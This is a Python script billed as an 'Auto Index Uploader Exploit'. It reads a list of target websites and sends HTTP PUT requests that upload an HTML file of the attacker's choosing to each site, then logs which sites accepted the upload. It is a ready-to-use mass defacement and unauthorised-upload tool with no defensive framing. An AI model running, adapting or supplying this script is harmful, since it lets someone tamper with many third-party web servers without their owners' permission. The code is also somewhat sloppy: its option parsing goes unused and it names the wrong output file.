from ast import arguments
from optparse import OptionParser
from colorama import Fore
import requests
import sys
import optparse

# Renkler
sifirla = "\033[0m"
kirmizi = "\033[1;31m"
yesil = "\033[1;32m"
cyan = "\033[1;36m"

# Semboller
arti = yesil + "[" + kirmizi + "+" + yesil + "]"
eksi = kirmizi + "[" + kirmizi + "-" + kirmizi + "]"
yildiz = yesil + "[" + kirmizi + "*" + yesil + "]" + sifirla
soru_isareti = yesil + "[" + kirmizi + "?" + yesil + "]"
unlem = yesil + "[" + kirmizi + "!" + yesil + "]"


def help_menu():
    parser = optparse.OptionParser (add_help_option = False)
    parser.add_option ('-h', '--help', action = 'help', help = "Show this help menu.")
    parser.add_option("-l", "--list", action="store_false", dest="list", default=True,help="Add list of target sites in TXT format")
    parser.add_option("-f", "--file", action="store_false", dest="file", default=True,help="Add the name of the file you want to upload to the server in HTML format.")

    return parser.parse_args()

def menu():
    print(kirmizi + """                   _                     
         __      _/ | _____      ___ __  
         \ \ /\ / / |/ _ \ \ /\ / / '_ \ 
          \ V  V /| | (_) \ V  V /| | | |
           \_/\_/ |_|\___/ \_/\_/ |_| |_|"""+ cyan +"""
         .:: Auto Index Uploader Exploit ::.
                # Coded By wolkan #
                                 """)

menu()
help_menu()

target = open(sys.argv[2], 'r')

while True:
 site_checker = open(sys.argv[4]).read()
 success = open('w1own_result.txt', 'a')
 host = target.readline().replace('\n','')
 outname = '/'+sys.argv[4]
 if not host:
  break
 print(yildiz + ' Sending Files : '+sys.argv[4])
 print(yildiz + ' Target        : '+host)
 
 try:
    r = requests.request('put', host + outname, data=site_checker, headers={'Content-Type':'application/octet-stream'})
 
 except:
    print(eksi + ' Failed        : Null Respone\n')
    pass
    continue
 
 if r.status_code == 200:
  print(arti + ' Success       : '+host+outname+'\n')
  success.write(host+outname+'\n')
 
 else:
  print(eksi + ' Failed        : '+host+outname+'\n')
    
print(unlem +" Output Saved On : w1own_results.txt")